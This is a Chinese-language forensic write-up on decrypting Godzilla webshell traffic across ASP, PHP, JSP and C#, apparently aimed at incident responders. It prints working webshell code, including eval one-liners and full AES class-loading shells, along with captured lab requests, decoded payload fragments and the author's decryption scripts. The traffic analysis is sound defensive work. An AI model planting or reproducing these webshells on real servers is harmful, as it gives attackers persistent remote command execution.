> 哥斯拉是继菜刀、蚁剑、冰蝎之后的又一个webshell利器，这里就不过多介绍了。  
> GitHub地址：<https://github.com/BeichenDream/Godzilla>  
> 很多一线师傅不太了解其中的加解密手法，无法进行解密，这篇文章介绍了解密的方式方法，主要补全了网上缺少的ASP流量分析、PHP解密脚本和C#解密脚本。

我们开始吧。

### ASP

生成选择，有效载荷：AspDynameicPayload，加密器：ASP\_EVAL\_BASE64。会生成如下WEBSHELL：

```java
<%eval request("pass")%>
```

点击测试连接，会生成两段POST流量，第一段为：

```java
POST /webshell.asp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 192.168.201.136
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 26290

pass=eval%28%22Ex%22%26c......kIEZ1bmN0aW9u

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
Set-Cookie: ASPSESSIONIDQAACSTCQ=DADFNONAEJDDOAOBNENOFIKJ; path=/
Date: Thu, 07 Sep 2023 12:11:37 GMT
Content-Length: 0
```

第二段为：

```java
POST /webshell.asp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Cookie: ASPSESSIONIDQAACSTCQ=DADFNONAEJDDOAOBNENOFIKJ;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 192.168.201.136
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 4104

pass=eval%28%22Ex%22%26cHr......AAAAdGVzdA%3D%3D
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
Date: Thu, 07 Sep 2023 12:11:41 GMT
Content-Length: 16

828130b2s=20ebbc
```

两段流量形式相同，我们先看第一段。

将请求头URL解码，得到如下内容：

```java
pass=eval("Ex"&cHr(101)&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=Mid(s,i,2):If IsNumeric(Mid(s,i,1)) Then:Execute(""""bd=bd&chr(&H""""&c&"""")""""):Else:Execute(""""bd=bd&chr(&H""""&c&Mid(s,i+2,2)&"""")""""):i=i+2:End If""&chr(10)&""Next:End Function:Ex"&cHr(101)&"cute(""""On Error Resume Next:""""&bd(""""0d0a536574206279......340d0a0d0a"""")):Response.End"")")
&key=U2V0IFBhcmFtZXRl......
```

首先是传递pass参数，参数中确定了服务超时时间，另外定义了一个函数bd，主要用来解析十六进制值来构建一个字符串。最后跟随一个key字符，目前尚不明确它的作用。

看完之后我们就知道了如何对内容进行解码了：对其中bd函数引入的字符串进行16进制转10进制解码，得到如下内容：

```java
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if
End Function

content=request.Form("key")
  if not IsEmpty(content) then

      if  IsEmpty(Session("payload")) then
          content=decryption(Base64Decode(content),false)
          Session("payload")=content
          response.End
      else
          content=Base64Decode(content)
          bypassDictionary.Add "payload",Session("payload")
          Execute(bypassDictionary("payload"))
          result=run(content)
          response.Write("828130")
          if not IsEmpty(result) then
              response.Write Base64Encode(decryption(result,true))
          end if
          response.Write("20ebbc")
      end if
  end if
```

可以看到这是一段VBS代码，代码主要作用是处理来自客户端的 POST 请求数据。

函数Base64Decode用于将 Base64 编码的字符串解码为二进制数据。

函数decryption共有两个参数，第一个：content为字符串，第二个：isBin为布尔值。如果isBin为真，则返回content的二进制数据，如果isBin为假，则返回content文本数据。

接下来是处理POST请求的内容，首先读取请求中的key值，将其存储在content中。接下来检查Session("payload")是否为空，若为空，表示第一次请求，则将content进行base64解码后存储在Session("payload")中；若不为空，则将content进行base64解码后存储在bypassDictionary字典中，键名为payload。随后利用Execute函数执行Session("payload")内容，随后利用run函数执行content内容，将返回结果base64编码，并前后分别拼接828130与20ebbc。

总的来说，可以简化为执行key中的内容，并返回拥有前后6位混淆的base64编码结果。

随后我们解码key值，从代码可以看到是对其进行了base64解码，解码后得到如下代码：

```java
Set Parameters=Server.CreateObject("Scripting.Dictionary")
Function Base64Encode(sText)
    Dim oXML, oNode
    if IsEmpty(sText) or IsNull(sText) then
        Base64Encode=""
    else
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    If IsArray(sText) Then
......
......
......
        end if
        if  IsEmpty(run) then
            run="no result"
        end if
        if Err then
            run=run&chr(10)&Err.Description
        end if
        if not IsArray(run) then
            run = Stream_StringToBinary(run)
        end if
    End Function
```

这个代码就是一个典型的哥斯拉命令执行代码了，这里不做分析。

根据刚刚的逻辑，因为是第一次请求，没有历史Session("payload")，请求随之结束。

接下来是第二段，除key值外，其他内容一样，base64解码得到：

```java
methodName test
```

根据刚刚的逻辑，因为不是第一次请求了，所以执行key中的内容，即执行哥斯拉命令执行代码中的test函数：

```java
Function test()
        test="ok"
End Function
```

第二段流量的响应体为：

```java
828130b2s=20ebbc
```

根据代码逻辑，删除前后混淆字符，进行base64解码，得到：

```java
ok
```

表示测试连接成功。添加后右键进入目标，会产生如下流量：

```java
POST /webshell.asp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Cookie: ASPSESSIONIDQAACSTCQ=FADFNONAFLFLMHEDNHIFHKML;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 192.168.201.136
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 4116

pass=eval%28%22Ex%22%26cHr......mFtZQINAAAAZ2V0QmFzaWNzSW5mbw%3D%3D

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
Date: Thu, 07 Sep 2023 12:12:04 GMT
Content-Length: 4728

828130Q3VycmVudERpc......wYQo=20ebbc
```

解码方式与上面相同，请求体先进行url解码后，key字段进行base64解码；响应体去除前后字段就行base64解码，得到key值为：

```java
methodName getBasicsInfo
```

响应体为：

```java
CurrentDir : C:\inetpub\wwwroot\
OsInfo : Windows_NT
CurrentUser : 
FileRoot : C:/;D:/;
scriptengine : VBScript/5.8.16384
systemTime : 2023/9/7 20:12:04
ComSpec=%SystemRoot%\system32\cmd.exe
DriverData=C:\Windows\System32\Drivers\DriverData
OS=Windows_NT
......
......
......
WinDir : C:\Windows
ComSpec : C:\Windows\system32\cmd.exe
TEMP : C:\Windows\TEMP
TMP : C:\Windows\TEMP
NUMBER_OF_PROCESSORS : 2
OS : Windows_NT
Os2LibPath : %Os2LibPath%
PATHEXT : .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE : AMD64
PROCESSOR_IDENTIFIER : Intel64 Family 6 Model 158 Stepping 10, GenuineIntel
PROCESSOR_LEVEL : 6
PROCESSOR_REVISION : 9e0a
```

即运行哥斯拉命令执行代码中的getBasicsInfo函数得到的系统基本信息。

总结一下：哥斯拉ASP马在测试连接阶段会上传命令执行代码，之后每次利用时在key字段中携带指令执行命令执行代码中的函数。解码方式为：请求体先进行url解码后，db函数字段为16进制转10进制，key字段进行base64解码；响应体去除前后字段就行base64解码。

### PHP

生成选择，有效载荷：PhpDynameicPayload，加密器：PHP\_EVAL\_XOR\_BASE64。会生成如下WEBSHELL：

```php
<?php
eval($_POST["pass"]);
```

点击测试连接，会生成两段POST流量，第一段为：

```php
POST /webshell.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 192.168.201.129
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 53767

pass=eval%28base64_decode%28strr......RVEaQgBDWTVrRG47

HTTP/1.1 200 OK
Date: Wed, 13 Sep 2023 06:54:01 GMT
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
X-Powered-By: PHP/5.4.45
Set-Cookie: PHPSESSID=cvi7n0pjqj9tfm9c779ga7jni3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html
```

第二段为：

```php
POST /webshell.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Cookie: PHPSESSID=cvi7n0pjqj9tfm9c779ga7jni3;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 192.168.201.129
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 1263

pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D
HTTP/1.1 200 OK
Date: Wed, 13 Sep 2023 06:54:01 GMT
Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
X-Powered-By: PHP/5.4.45
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: PHPSESSID=cvi7n0pjqj9tfm9c779ga7jni3; path=/
Content-Length: 64
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html

72a9c691ccdaab98fL1tMGI4YTljOv79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488
```

两段流量形式相同，我们先看第一段。

将请求头URL解码，得到如下内容：

```php
pass=eval(base64_decode(strrev(urldecode('K0QfK0QfgACIgoQD9......FGdz9lbvl2czV2cApQD'))));
&key=R0YEQgNVBE0GQ0YPU0YTUhoeTAtvMkVmMH......
```

可以看到pass字段明确写出了解码顺序：先URL解码，然后反转字符串，然后BASE64解码。操作之后得到如下代码：

```php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='key';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

编写一个简单的脚本来解码key。

```python
import base64
import gzip

def XOR(D, K):
    result = []
    for i in range(len(D)):
        c = K[i + 1 & 15]
        if not isinstance(D[i], int):
            d = ord(D[i])
        else:
            d = D[i]
        result.append(d ^ ord(c))
    return b''.join([i.to_bytes(1, byteorder='big') for i in result])

if __name__ == '__main__':
    text = "R0YEQgN......EaQgBDWTVrRG47"
    key = "3c6e0b8a9c15224a"
    request = XOR(base64.b64decode(text), key)
    # response = gzip.decompress(XOR(base64.b64decode(text), key))
    print(request)
    # print(response)
```

得到如下代码：

```php
$parameters=array();
$_SES=array();
function run($pms){
    global $ERRMSG;

    reDefSystemFunc();
    $_SES=&getSession();
    @session_start();
    $sessioId=md5(session_id());
    if (isset($_SESSION[$sessioId])){
        $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId)));
    }
    @session_write_close();

    if (canCallGzipDecode()==1&&@isGzipStream($pms)){
        $pms=gzdecode($pms);
    }
    formatParameter($pms);

    if (isset($_SES["bypass_open_basedir"])&&$_SES["bypass_open_basedir"]==true){
        @bypass_open_basedir();
    }

    if (function_existsEx("set_error_handler")){
        @set_error_handler("payloadErrorHandler");
    }
    if (function_existsEx("set_exception_handler")){
        @set_exception_handler("payloadExceptionHandler");
    }
    $result=@evalFunc();
......
......
......
function isGzipStream($bin){
    if (strlen($bin)>=2){
        $bin=substr($bin,0,2);
        $strInfo = @unpack("C2chars", $bin);
        $typeCode = intval($strInfo[\'chars1\'].$strInfo[\'chars2\']);
        switch ($typeCode) {
            case 31139:
                return true;
            default:
                return false;
        }
    }else{
        return false;
    }
    }
    function getBytes($string) {
    $bytes = array();
    for($i = 0; $i < strlen($string); $i++){
        array_push($bytes,ord($string[$i]));
    }
    return $bytes;
    }
```

代码太长了，这里截了头和尾，其实又是一个典型的哥斯拉命令执行代码。

接下来看第二段。

请求头只有key值不一样，再次通过上面的代码解码，得到：

```php
methodName\x02\x04\x00\x00\x00test
```

可以看到是要执行上面代码中的test函数。该函数的内容为：

```php
function test(){
    return "ok";
    }
```

响应体为：

```php
72a9c691ccdaab98fL1tMGI4YTljOv79NDQm7r9PZzBiOA==b4c4e1f6ddd2a488
```

根据代码可以看到存在前后16位的混淆MD5加密值，删除后同样用上面的代码解码，得到：

```php
ok
```

### JSP

生成选择，有效载荷：JavaDynameicPayload，加密器：JAVA\_AES\_BASE64。会生成如下WEBSHELL：

```java
<%! String xc = "3c6e0b8a9c15224a";//这里传进来的密钥已经是 之前生成的时候输入的密钥的 md5值前16位，md5(123456)(0,16)
    String pass = "pass";
    String md5 = md5(pass + xc);

    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);//和冰蝎一样，使用的是defineClass方法加载Class字节码文件
        }
    }
    //x函数为AES加解密函数，m为true加密，m为false，解密，密钥使用的是xc参数(即生成的时候输入的密钥的md5值前16位)
    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }
    //计算md5取前16位并统一大小写，转为大写
    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }
    //反射方式调用base64对bs进行编码，做了一个兼容，java.util.Base64是jdk8才引入的
    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
    //反射方式调用base64对bs进行解码
    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }
%>
<%
    try {
        byte[] data = base64Decode(request.getParameter(pass));//获取请求体中密码参数对应的内容并base64解码
        data = x(data, false);//AES解密
        if (session.getAttribute("payload") == null) {
            session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));//字节码对象加载进X并置于session中
        } else {
            request.setAttribute("parameters", data);
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();//创建一个字节输出流
            Object f = ((Class) session.getAttribute("payload")).newInstance();//实例化发过来的class
            f.equals(arrOut);//调用重写的equal方法
            f.equals(pageContext);//调用重写的equal方法，注意和上面不一样
            response.getWriter().write(md5.substring(0, 16));//响应体流量先输出md5(pass + xc)的前16位(大写)
            f.toString();//调用重写的toString方法
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));//执行命令的响应内容加密返回
            response.getWriter().write(md5.substring(16));//响应体流量输出md5(pass + xc)的后16位(大写)
        }
    } catch (Exception e) {
    }
%>
```

点击测试连接，会生成两段POST流量，第一段为：

```java
POST /webshell.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 10.211.55.3:8080
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 49265

pass=xSzQNih3MLrj0essmirPNTrUPcD0Zwx......Jy1aDkEXNPtzHryUT0fGiLkhQWj0WrsePOtFeCe3eol9LigbmXw%3D%3D

HTTP/1.1 200 
Set-Cookie: JSESSIONID=A51936ADD3A8DECC988509D4597DBAD6; Path=/; HttpOnly
Content-Type: text/html
Content-Length: 0
Date: Sun, 08 Oct 2023 03:26:06 GMT
```

第二段为：

```java
POST /webshell.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Cookie: JSESSIONID=A51936ADD3A8DECC988509D4597DBAD6;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: 10.211.55.3:8080
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 73

pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g

HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 76
Date: Sun, 08 Oct 2023 03:26:06 GMT

11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC
```

我们都比较熟练了，看代码，应该对pass字段先URL解码、base64解码，然后AES解密，这里使用CyberChef工具进行解密。

![Untitled 1.png](https://shs3.b.qianxin.com/attack_forum/2023/11/attach-5de6934d0e379c2dca3aac0245304d150a80fd7c.png)

解密后反编译Class文件得到恶意类文件：

```java
package org.apache.coyote.type;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
......
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.imageio.ImageIO;

public class TypeBindings extends ClassLoader {
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    HashMap parameterMap = new HashMap();
    HashMap sessionMap;
    Object servletContext;
    Object servletRequest;
    Object httpSession;
    byte[] requestData;
    ByteArrayOutputStream outputStream;

    public TypeBindings() {
    }
......
......
......
            if (shiftto == 6) {
                dst[dp++] = (byte)(bits >> 16);
            } else if (shiftto == 0) {
                dst[dp++] = (byte)(bits >> 16);
                dst[dp++] = (byte)(bits >> 8);
            } else if (shiftto == 12) {
                throw new IllegalArgumentException("Last unit does not have enough valid bits");
            }

            if (dp != dst.length) {
                byte[] arrayOfByte = new byte[dp];
                System.arraycopy(dst, 0, arrayOfByte, 0, Math.min(dst.length, dp));
                dst = arrayOfByte;
            }

            return dst;
        }
    }
}
```

又是一个典型的哥斯拉命令执行代码。

接下来看第二段，对请求体解密：

![Untitled 2.png](https://shs3.b.qianxin.com/attack_forum/2023/11/attach-0ad305ded82aa44245f958a04b2d1aeb9abb5903.png)

得出：

```java
methodName test
```

即执行test函数，函数内容为：

```java
public byte[] test() {
        return "ok".getBytes();
    }
```

对响应体解密：

![Untitled 3.png](https://shs3.b.qianxin.com/attack_forum/2023/11/attach-65ebbe7e2845e663b8bae7a33ee73232daa25b4f.png)

去除前后16位的混淆字节，解码得到：

```java
ok
```

### CSHAP

生成选择，有效载荷：CshapDynamicPayload，加密器：CSHAP\_AES\_BASE64。会生成如下WEBSHELL：

```java
<%@ Page Language="C#" %>
<%
try
{
    string key = "3c6e0b8a9c15224a";
    string pass = "pass";
    string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider()
        .ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", "");
    byte[] data = System.Convert.FromBase64String(Context.Request[pass]);
    data = new System.Security.Cryptography.RijndaelManaged()
        .CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);

    if (Context.Session["payload"] == null)
    {
        Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly)
            .GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
    }
    else
    {
        System.IO.MemoryStream outStream = new System.IO.MemoryStream();
        object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY");
        o.Equals(Context);
        o.Equals(outStream);
        o.Equals(data);
        o.ToString();
        byte[] r = outStream.ToArray();

        Context.Response.Write(md5.Substring(0, 16));
        Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged()
            .CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));
        Context.Response.Write(md5.Substring(16));
    }
}
catch (System.Exception){ }
%>
```

点击测试连接，会生成如下两段流量。

第一段为：

```java
POST /About HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: localhost:56956
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 29045

pass=N7NGXwlJOU3......C7x2%2FnPekpLuE1J

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=u4egxprswvkb0t1uectw2foi; path=/; HttpOnly; SameSite=Lax
X-AspNet-Version: 4.0.30319
X-SourceFiles: =?UTF-8?B?QzpcVXNlcnNcNTkzMDJcc291cmNlXHJlcG9zXFdlYlNpdGUyXEFib3V0?=
X-Powered-By: ASP.NET
Date: Tue, 31 Oct 2023 09:48:57 GMT
Content-Length: 0
```

第二段为：

```java
POST /About HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Cookie: ASP.NET_SessionId=u4egxprswvkb0t1uectw2foi;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Host: localhost:56956
Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 71

pass=WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o

HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-SourceFiles: =?UTF-8?B?QzpcVXNlcnNcNTkzMDJcc291cmNlXHJlcG9zXFdlYlNpdGUyXEFib3V0?=
X-Powered-By: ASP.NET
Date: Tue, 31 Oct 2023 09:48:57 GMT
Content-Length: 76

11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC
```

同样的，我们先看第一段，根据WEBSHELL中的内容，我写了一个小的C#语言的解密脚本：

```csharp
using System;

namespace ConsoleApplication4
{
    internal static class Program
    {
        public static void Main(string[] args)
        {
            string key = "3c6e0b8a9c15224a";
            byte[] data = System.Convert.FromBase64String(Uri.UnescapeDataString("WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o"));
            // 使用密钥对数据进行解密
            data = new System.Security.Cryptography.RijndaelManaged()
                .CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key))
                .TransformFinalBlock(data, 0, data.Length);
            string result = BitConverter.ToString(data).Replace("-", ""); // 移除中间的连字符
            Console.WriteLine("HEX = " + result);
        }
    }
}
```

解密得到：

```java
4D5A90000300000004......000000000000000000
```

说明这是一个应用程序，使用CyberChef转换并导出DLL文件：

![Untitled 4.png](https://shs3.b.qianxin.com/attack_forum/2023/11/attach-46f27b84bd3c214d58eb0d65e91ed827ecd2699c.png)

然后丢到dnSpy中进行下反编译。

![Untitled 5.png](https://shs3.b.qianxin.com/attack_forum/2023/11/attach-884cb3641cf31693adfba47ad8016a5aa377b393.png)

得到代码：

```csharp
using System;
using System.Collections;
using System.Data;
